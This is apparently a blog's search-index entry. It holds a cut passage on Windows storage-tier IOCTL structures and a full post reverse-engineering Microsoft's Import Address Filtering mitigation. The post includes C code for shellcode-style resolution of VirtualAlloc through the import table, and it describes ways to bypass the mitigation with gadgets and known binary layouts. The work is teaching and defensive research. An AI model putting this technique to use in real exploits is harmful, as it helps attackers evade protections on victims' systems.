field_AFF;           //because needs more reversing}POOLINFO, *PPOOLINFO;        SpIoctlCreateTier          purpose : to create a tier associated with a pool      SpAccessCheck security verification      IOCTL code: 0xE7D410              input:a structure like the following:        typedef struct{  int length_bis;  int length;  GUID PoolGUID;  GUID TierGUID;  GUID spaceGUID;  wchar_t friendlyName[256];  wchar_t description[1024];  int usage;  int field_A3C;  __int64 field_A40;  BYTE gapA48[16];  int field_A58;  int field_A5C;  __int64 field_A60;  int mediatype;  int field_A6C;  int faultDomainAwareness;  int AllocationUnitSize;  int field_A78;  int numOfGuids;  int offsetGuids;  int field_A84;  int physicalDiskRedundancy;  int NumberOfDataCopies;  int field_A90;  int NumberOfColumns;  int Interleave;  int field_A9C;  int field_AA0;  int field_AA4;  __int64 field_AA8;  char additionalData[];}POOLTIER, *PPOOLTIER;                    output: no particular output        SpIoctlDeleteTier          purpose : to delete a tier      SpAccessCheck security verification              IOCTL code: 0xE7D414                  input: a structure containing the GUID of the pool whose tier is attached, and the GUID of the tier:                typedef struct{  GUID poolGUID;  GUID tierGUID;} POOLDELETETIER, *PPOOLDELETETIER;                    output: no particular output        SpIoctlGetTierInfo          purpose : get the information about a tier      no particular access checks      IOCTL code: 0xE71408      input: a structure like this one (which is the starts of a POOLTIER structure):          typedef struct  {    int unk;    int length;       //should be set to 0x28    GUID PoolGUID;    GUID TierGUID;  }              output : a POOLTIER structure      "
  },
  
  {
    "title": "Inside Import Address Filtering",
    "url": "/posts/inside-import-address-filtering/",
    "categories": "blogpost",
    "tags": "",
    "date": "2021-11-13 22:57:40 +0100",
    





    "snippet": "Short Intro and past referencesFor a course I teach, I wanted to present the modern mitigations one can encounter on Windows. I focused on those aimed at preventing shellcode execution and ROP, because this course was on stack buffer overflows. Namely, the interesting ones are:  Stackpivot  CallerCheck  SimExec  Import Address Filtering (IAF)  Export Address Filtering (EAF)One of my students asked me how those mitigations really work. While Microsoft explains quite extensively its mitigations within this document, their internals are still quite obscure.Moreover, past references that go into details appear to be quite outdated, as they were principally referencing EMET, which is now deprecated. For exemple, at that time, EMET was using hardware breakpoints instead of guard pages:  Using EMET to disable EMET by A. Alsaheel and R. Pande  BYPASSING EMET 4.1 by Jared DeMott  Disarming EMET 5 52 by Niels WarnarsRecent ones are not that useful : one can find a 2019 paper on science direct, presenting a bypass of EAF by removing guard pages. This paper does not go into details either. The best bet is finally the documentation of the ETW related to Microsoft’s exploit guard done by Palantir. Some of the events like EAF are quite detailed, but for others like IAF, there is not much of an explanation.In the end, I was not able to explain in detail how those mitigations work under the hood…Let’s try to fill this gap: the following blog post will try to present the internals of “Import Address Filtering”, and how it should (or not) be used. It assumes the reader is familiar with how binaries are executed (virtual address space and libraries). PE format knowledge is a plus.This blog post is the result of some reverse-engineering sessions of the PayloadRestrictions dll found inside System32, on a Windows 10. As such, following results are prone to interpretation errors. Don’t hesitate to correct me if I’m wrong.an IAF primerPurposeWhen exploiting a vulnerable target, the attacker often hijacks the control flow of the application to redirect it to code that is profitable to him. However, most of the time, the vulnerable application does not ship the code the attacker wants to be executed. To circumvent this, the attacker often relies on injecting raw executable code, in the form of shellcode, to execute the wanted code in the context of the vulnerable application.Like any code, shellcodes often rely on using standard library functions available on the system : it reduces their complexity and size. To call those standard functions, the shellcode needs to know their addresses in the virtual address space of the vulnerable program. For a legitimate binary, the binary loader will iterate over all the functions the binary uses, load the appropriated Dlls inside the address space of the program, and will fill a table inside the binary containing all the addresses of the functions it needs. Then, the legitimate binary just has to lookup this table to call any function. Because the shellcode is injected by the attacker and not loaded legitimately by the operating system, it has no such table containing the necessary addresses filled up automatically by the binary loader. The shellcode  has so to resolve by itself the addresses of the functions it needs.One way for a shellcode to resolve the functions’ addresses by itself is to access a known structure, known as the InMemoryOrderModuleList. This structure contains a list of all modules (Dlls+main program) loaded inside the address space of a program, with their name and base address. With this information, the shellcode is able to parse the Dlls in memory to access the list of their exported functions, and with that, their addresses. To avoid such a resolution of the addresses by a shellcode, Windows implemented a first mitigation known as “Export address Filtering”(EAF).To circumvent this mitigation, attackers started to use another way to resolve the functions’ addresses. Do you remember the table containing all the addresses of the functions used by a legitimate binary that is filled up by the binary loader? Instead of searching for the exported functions of the Dlls, one can search for this table, known as the imports, by parsing each module obtained through the InMemoryOrderModuleList structure (or directly from the main program). IAF purpose is to thwart such a resolution of addresses.In the end, while most of the security mitigations attempt to prevent code execution on the machine, IAF/EAF is interesting because it assumes that code execution is already achieved. It adds as such another layer to bypass in the whole exploitation process.Reminder on PE importsBefore going further, let’s remind ourselves how imports work for a Windows executable. The Windows format for its executables is known as the PE format. It’s first made of some headers, indicating how to read the binary. Inside these headers, one can find the data directories, which are (as their name suggest) “pointers” to directories containing defined data for the executable. One of this directory is the import directory, that contains all the structures required for the binary loader to know what Dlls to load inside the binary address space, and what functions addresses need to be resolved. Another directory is the import address table, which will contain the addresses of all the imported functions once the binary is loaded with its modules.The import directory is a table of IMAGE_IMPORT_DESCRIPTOR structures. Each one of these permit to load a defined DLL and its associated functions. It contains the following three important fields:  Imported Dll Name : a RVA (relative virtual address, eg an offset from the base of the program) pointing to the Dll name to be imported  OriginalFirstThunk : a RVA pointing to a table of IMAGE_THUNK_DATA structures. We will name this table the HintName array.  FirstThunk: a RVA pointing to an offset inside the import address table. At this offset, when the binary is not loaded, one can find the same table of IMAGE_THUNK_DATA structures than in OriginalFirstThunk. We will name this table the RealImports array. The import address table is so made up of all the RealImports arrays from each FirstThunk of each IMAGE_IMPORT_DESCRIPTOR.The IMAGE_THUNK_DATA structures contain either the ordinal of the imported API or an RVA to an IMAGE_IMPORT_BY_NAME structure. The IMAGE_IMPORT_BY_NAME structure is just a WORD, followed by a string naming the imported API. The WORD value is a “hint” to the loader as to what the ordinal of the imported API might be.Here is a schema presenting what it looks like before the binary is fully loaded:When a function is resolved by the loader, it will overwrite the associated IMAGE_THUNK_DATA  inside the RealImport array with the real value of its address in the program address space. Here is what it becomes:In the end, (for the sake of simplicity), all RealImports arrays, and as such the import address table, will contain all the addresses of all imported functions. The binary has just to call the address present at the correct offset inside the import address table to call the associated function from any Dll.Triggering IAFWhen I said that attackers can parse imports to resolve a function address inside a shellcode, here is an example C code. Once compiled, it could be used as a shellcode, resolving VirtualAlloc address in a generic manner :uintptr_t getVirtualAllocAddress(){	char expectedDllName[] = { &#39;K&#39;, &#39;E&#39;, &#39;R&#39;, &#39;N&#39;, &#39;E&#39;, &#39;L&#39;, &#39;3&#39;,&#39;2&#39;,&#39;\\0&#39; };	char expectedFunctionName[] = { &#39;V&#39;,&#39;i&#39;,&#39;r&#39;,&#39;t&#39;,&#39;u&#39;,&#39;a&#39;,&#39;l&#39;,&#39;A&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;c&#39;,&#39;\\0&#39; };	PIMAGE_THUNK_DATA OriginalFirstThunkData, FirstThunkData;	bool found = FALSE;	//get peb	PPEB peb = (PPEB)__readgsqword(0x60);		// get the base address of our main program	uintptr_t baseProgramAddress = (uintptr_t) (peb-&amp;gt;ImageBaseAddress);	//get the VA of the NT header	uintptr_t ntAddress = baseProgramAddress + ((PIMAGE_DOS_HEADER)baseProgramAddress)-&amp;gt;e_lfanew;	//get the import directory	PIMAGE_IMPORT_DESCRIPTOR ImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(baseProgramAddress + ((PIMAGE_NT_HEADERS)ntAddress)-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);    // search each import descriptor to get the one corresponding to kernel32.    // this character by character method is not optimal, but easy to read	for (; ImportDesc-&amp;gt;Name != 0; ImportDesc++) {		//first get dll Name within the import descriptor		char* DllName = (char*)(baseProgramAddress + ImportDesc-&amp;gt;Name);		//next check if this is the correct one		int i = 0;		for (i = 0; i &amp;lt; 8; i++) {			if (DllName[i] != expectedDllName[i])				break;		}		if (i != 8)			continue;		found = TRUE;		break;	}		//now we got the import descriptor associated with kernel32.dll, we will search virtualAlloc function inside	if (!found)		return 0;	//get the original first thunk, which will point to Hint/FunctionName	OriginalFirstThunkData = (PIMAGE_THUNK_DATA)(baseProgramAddress + ImportDesc-&amp;gt;OriginalFirstThunk);		//get the first thunk, which points directly to the IAT	FirstThunkData = (PIMAGE_THUNK_DATA)(baseProgramAddress + ImportDesc-&amp;gt;FirstThunk);		//searching for virtualAlloc function	found = FALSE;	for (;OriginalFirstThunkData-&amp;gt;u1.AddressOfData != 0; OriginalFirstThunkData++, FirstThunkData++)	{		char* FunctionName = (char*)(baseProgramAddress + OriginalFirstThunkData-&amp;gt;u1.AddressOfData + 2);		int i = 0;		for (i = 0; i &amp;lt; 13; i++) {			if (FunctionName[i] != expectedFunctionName[i])				break;		}		if (i != 13)			continue;		found = TRUE;		break;	}	if (!found)		return 0;	//now we have the address of the VirtualAlloc function inside the IAT	uintptr_t VirtualAllocAddress = (uintptr_t)(FirstThunkData-&amp;gt;u1.AddressOfData);	return VirtualAllocAddress;}The idea is to get the list of IMAGE_IMPORT_DESCRIPTOR structures, get the one associated with kernel32.dll. We then iterate over the HintName array until we find the VirtualAlloc function. The index in this table gives as such the corresponding index inside the RealImports array, where we will find the VirtualAlloc address.We can now allocate a RWX region, copy our shellcode inside, and check that IAF is triggered (if set on the binary). An example project is given inside the trigger_IAF subdirectory.First security observations on IAFThe first thing to note is that IAF should be used in conjonction with EAF for it to be effective. If an attacker knows you’re using IAF without EAF, he can use the “exports way” to get the addresses for his shellcode. The opposite is also true.The other thing to note is that IAF/EAF is only useful for applications processing external data, meaning the attacker is in a remote code execution context for his exploitation attempt. Such applications may be browsers, pdf readers, office-like applications, http servers. Indeed, Windows init DLLs are mapped at the same address within each process’s virtual address space (for performance and optimisations concerns). In a local context (for example local privilege escalation), an attacker can so first run a binary normally (the binary will be considered legitimate in regards to IAF/EAF), where this binary will obtain all the necessary addresses for a shellcode. The attacker can then craft its shellcode with the previously obtained addresses, and inject it into the vulnerable program with the exploit. Because all functions’ addresses were known prior to the execution, no resolution is required, and IAF/EAF cannot trigger.Let’s now dissect IAF and see how it works.IAF internalsIAF setupIAF is setup in 4 steps:      First, the entry point of the application is hooked using Detours API. The target function that gets called with this hook is MitLibHooksDispatcher. The idea of this hook is to activate the IAF mitigation only once the process and its modules are fully loaded in memory.        One page of memory (size = 0x1000) is allocated within the virtual address space of the program. We will call this memory the IAFShadowmemory. Inside this page is constructed a fake array of IMAGE_IMPORT_BY_NAME structures, where Hint is always set to 0, with the following function names:       - GetProcAddress   - GetProcAddressForCaller   - LoadLibraryA   - LoadLibraryExA   - LoadLibraryW   - LoadLibraryExW   - LdrGetProcedureAddress   - LdrGetProcedureAddressEx   - LdrGetProcedureAddressForCaller   - LdrLoadDll   - VirtualProtect   - VirtualProtectEx   - VirtualAlloc   - VirtualAllocEx   - NtAllocateVirtualMemory   - NtProtectVirtualMemory   - CreateProcessA   - CreateProcessW   - WinExec   - CreateProcessAsUserA   - CreateProcessAsUserW   - GetModuleHandleA   - GetModuleHandleW   - RtlDecodePointer   - DecodePointer        For the rest of this post, this function list will be called IafApiList.        Whenever a module is loaded (obtained through the LdrDllNotificationCallback) - and automatically for the following dlls: kernelbase, kernel32, ucrtbase, payloadrestrictions and verifier - the function MitLibIAFProtectModule is called.    This function iterates over all the imports of the module : if the imported function’s name matches one of the IafApiList, then the RVA of the given function’s IMAGE_THUNK_DATA inside the Hintname array is modified with the RVA of the corresponding IMAGE_IMPORT_BY_NAME inside the IAFShadowMemory.    Here is a schema indicating what it looks like:            When the entry point of the application is reached, due to the hook, the function MitLibActivateProtections is called. This function sets up a new ExceptionHandler (that will be used to catch accesses to guard pages), ensures all memory locations within modules that should be set with PAGE_GUARD right are set correspondingly (primarily used by EAF), and finally it sets the memory rights of the IAFShadowMemory to PAGE_GUARD|READ_ONLY.  IAF processingWhen a guard page is accessed, an exception is generated. With the previously set exception handler, MitLibExceptionHandler is called.The code for this function is really simple and could be written as such:DWORD MitLibExceptionHandler(_EXCEPTION_POINTERS *ExceptionInfo){  if(!g_MitLibState.IsExceptionHandlerSet)                  (1)    return 0;  DWORD ExceptionCode = ExceptionInfo-&amp;gt;ExceptionRecord-&amp;gt;ExceptionCode;  switch(ExceptionCode)  {  if(STATUS_GUARD_PAGE_VIOLATION == ExceptionCode){    return MitLibValidateAccessToProtectedPage(ExceptionInfo-&amp;gt;ExceptionRecord, ExceptionInfo-&amp;gt;ContextRecord);  } else if (STATUS_SINGLE_STEP == ExceptionCode) {    return MitLibHandleSingleStepException();  } else {    return 0; //exception not handled  }}The MitLibValidateAccessToProtectedPage function is the one of interest. It does the following: it first checks if the address guarded from the exception is inside the IAFShadowMemory. If yes, it calls MitLibProcessIAFGuardPage. Otherwise (meaning we are in one EAF guard page), it does other checks. I will name this last part MitLibProcessEAFGuardPage, and that will be potentially presented in another post.The MitLibProcessIAFGuardPage does the following three checks:  It checks first if the instruction pointer who raised exception is inside a memory module, by using RtlPcToFileHeader function.      If this is the case, the list of EAFplus only protected modules (e.g. mshtml or jscript9 but not kernel32, kernelbase or ntdll) is iterated over : if this is the module who raised the exception, the function MitLibMemReaderGadgetCheck is called. At the end, it is checked if this function has not detected any memory reader gadget.    This function works like so:          it disassembles the instruction that generated the exception      it makes several checks on the disassembled instruction. Especially, it will be considered a gadget if:                  the instruction opcode is either a mov, movsx, movsxd or movzx          the second operand of the operation is a memory access (e.g using [&amp;lt;value&amp;gt;])          the second operand validates several obscure underlying checks for which I don’t understand the logic.Indeed, due to these last obscure underlying checks, the following type of instructions will be considered gadgets:              mov &amp;lt;register&amp;gt;, [ &amp;lt;register&amp;gt; + &amp;lt;scale&amp;gt; * &amp;lt;register&amp;gt;]  mov &amp;lt;register&amp;gt;, [ &amp;lt;register&amp;gt; ]  mov &amp;lt;register&amp;gt;, [ &amp;lt;register&amp;gt; + &amp;lt;scale&amp;gt; * &amp;lt;register&amp;gt; + &amp;lt;displacement&amp;gt; ]                        While these ones will not:              mov &amp;lt;register&amp;gt;, [ &amp;lt;register&amp;gt; + &amp;lt;displacement&amp;gt; ]                                            Finally, it checks if the stack pointer is comprised between the boundaries of the declared stack for the current thread (eg. between NtTib.StackBase and NtTib.StackLimit)If any of these check fails, an  IAF violation error is reported. Finally, if the mitigation is not in audit mode, then a __fastfail() is triggered.if all checks passed, then the execution is passed in single-step mode through the activation of the trap flag inside RFLAGS. On the next instruction executed, a STATUS_SINGLE_STEP exception is so raised, that will be catched by our handler, and MitLibHandleSingleStepException will reset the PAGE_GUARD right.A better IAF state-of-security as a mitigationKnowing how IAF works internally, we are now able to state deeper on the efficiency of IAF as a mitigation for remote exploitations :      IAF tries to block only API names resolution. There is no protection on IAT per se.        If an attacker is able to know/leak the precise version of the vulnerable binary before launching the exploitation, and has access to the corresponding binary, then IAF can be easily bypassed. Such cases are browsers, where attacks occur in two steps (as demonstrated by p0’s in-the-wild-series): a fingerprinting of the browser is made first. With this information, the appropriate exploit is then launched.    Why? Because if the attacker knows the precise version, he knows where the appropriate function address will be in the IAT of the vulnerable binary (this is fixed at compilation time). He does not have to parse the import descriptors’ OriginalFirstThunks to look out for the correct function name, and he will not trigger IAF mitigation at all.    Accessing the correct address where to find a said function can be easily done with CFF Explorer for example. Go to the “Import Directory” tab, click on “Kernel32.dll”. There are two pieces of information to get: the IAT offset and the index of the VirtualAlloc function in the OriginalFirstThunks list. With this information, the VA at which you will get the current address of VirtualAlloc is simply :      Base Program address + IAT offset + 8*(index of VirtualAlloc)            Rest the case where the remote attack occurs against a large variety of versions for the same target, and in this case the attacker is not able to retrieve the precise version of the target (we state so that the attacker is not able to retrieve the current versions of the dlls in use on the system). An attacker willing to use imports for his shellcode should:          bypass the check on the limits of the stack. It’s kind of difficult to state on this check, because it depends entirely on the exploitation method and the primitives the attacker is able to gain. It can be really effective as well as completely useless…      bypass the check stating that the address generating the exception is inside a defined module. For this, the idea is to use gadgets, either inside kernel32, kernelbase or ntdll; or to use gadgets from the EAFPlus modules that are of the form mov &amp;lt;register&amp;gt;, [ &amp;lt;register&amp;gt; + &amp;lt;displacement&amp;gt; ]. Because the attacker does not know the different versions of the Dlls, he has to scan the modules for a given code pattern, or compare the versions of the Dlls against a known database of gadgets. The requirement for a successful exploitation appears higher, but it’s still something not that complicated to do.      bypass the check on memory gadgets? Simply use the same methods from the previous point.      ConclusionThe design of IAF, as well as EAF,  won’t have a huge impact on performance, and as such, can certainly be used for a majority of use-cases. In the end, it appears IAF might be interesting, in conjunction with EAF/EAFPlus, to thwart attackers that did not take into account these mitigations while exploiting a vulnerable binary in a RCE context. However, if an attacker has taken into account the possibility that IAF/EAF might be activated on the remote target, then he will certainly be able to bypass it.There seems to be no good answer as to if IAF/EAF should be enabled or not.I would love to see an IAFPlus, with stricter checks. For example, it seems that if an application does not use LoadLibrary and does not have delay-loaded imports, one could prevent all OriginalFirstThunks access for name resolution. It would be also interesting to see some kind of IAT randomization inside the PE format to force any code trying to resolve address to first resolves names.additional notes(1) g_MitLibState is a globale structure defining the current state of the modern mitigations applied to the binary. It’s in fact comprised of the whole .Mrdata section inside the PayloadRestrictions dll. While this section is marked as READ_ONLY, whenever the structure needs to be filled with data, this section is passed as READWRITE by PayloadRestrictions’s functions and then passed again to READ_ONLY.Here is the structures layout:struct gmitlib_module_info_struct{  void*     baseaddress;  uint32_t  sizeOfimage;  uint32_t  indexGuardedPageInfo;  char*     moduleName;  char*     modulePath;  uint32_t  moduleStatus;  uint32_t  isEAFPlusProtection;};struct gmitlib_guard_info_struct{  uint32_t  index_module;  uint32_t  newProtect;  void*     baseaddressAligned;  void*     baseAddress;};struct eafplus_module_struct{  char*    moduleName;  char*    Extension_if_glob;  uint64_t sizeModuleName;};struct gmitlib_protected_apis_struct{  void*     apiName;  uint32_t  lenApiName;  uint32_t  unk0;  void*     encodedPointerShadowMemory;};/*alignment on 8*/typedef struct {  char                          unk0;  char                          HasIAFOrEAF;  char                          HasROPMitigations;  char                          IsExceptionHandlerSet;  char                          isOneModuleProtectedAgainstROP;  char                          IsEntrypointHooked;  uint32_t                      MitigationOptionsValue;  uint32_t                      numProtectedModules;  uint32_t                      numberEAFPlusModules;  uint32_t                      availableIndexListModifiedpages;  uint64_t                      indexTlsbitmap;  void*                         baseProgramAddress;  void*                         EAFPlusShadowMemoryAddr;  *void*                        IAFShadowMemoryAddr;  uint32_t                      RealSizeIAFShadowMemory;  uint64_t                      unk1;  HANDLE                        SecurityMitigationsProviderRegistrationHandle;  gmitlib_module_info_struct    listProtectedModules[35];     //you can have up to 32 EAFPlus modules   gmitlib_guard_info_struct     listGuardedMemoryPages[35];   //listed with ImageFileExecutionOptions  eafplus_module_struct         listEAFplusModules[32];       //registry key  gmitlibdetour_struct          HookedFunctions[47];          //size element = 0x28  HANDLE                        eventHandle0;  HANDLE                        eventHandle1;  void*                         EncodedPointerHeapEvent;  char                          ProgramName[520];  uint32_t                      sizeFullProgramName;  gmitlib_protected_apis_struct IAFProtectedApis[26];} g_MitLibState_struct;"
  }
  
]

